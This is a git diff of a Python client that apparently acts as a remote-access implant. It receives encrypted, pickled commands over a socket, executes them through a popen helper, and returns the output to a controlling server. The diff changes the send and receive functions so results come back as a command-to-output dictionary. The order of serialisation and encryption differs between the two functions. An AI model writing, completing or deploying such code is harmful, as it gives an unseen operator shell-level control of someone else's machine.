@@ -40,7 +40,10 @@ def popenExecution(data):
 #   --> Send a payload to the server, serializes into an encryption
 def send(socket, payload):
     try:
-        socket.send(pickle.dumps(encryptAES(payload, key))) #Serialize --> encrypt --> send
+        payload = pickle.dumps(payload)
+        payload = encryptAES(payload, key)
+        socket.send(payload)
+        #socket.send(pickle.dumps(encryptAES(payload, key))) #Serialize --> encrypt --> send
     except Exception as e:
         print(e)
         time.sleep(1)
@@ -48,10 +51,11 @@ def send(socket, payload):
 #   --> Receives a command, deserializes into a decryption, into a execution. Sends the output of that back
 def receive(socket):
     try:
-        message = decryptAES(pickle.loads(socket.recv(2048)), key) #deserialize --> decrypt
-        # ||||| SHOULD SEND {COMMAND : OUTPUT}
-        send(socket, popenExecution(message)) # --> execute 
-        print(message) #show what you got || SAFE TO REMOVE
+        command = decryptAES(pickle.loads(socket.recv(2048)), key) #deserialize --> decrypt
+        result = popenExecution(command.decode('utf-8'))
+        response = {command : result}
+        print(response)
+        send(socket, response) # --> send 
 
     except Exception as e:
         print(e)
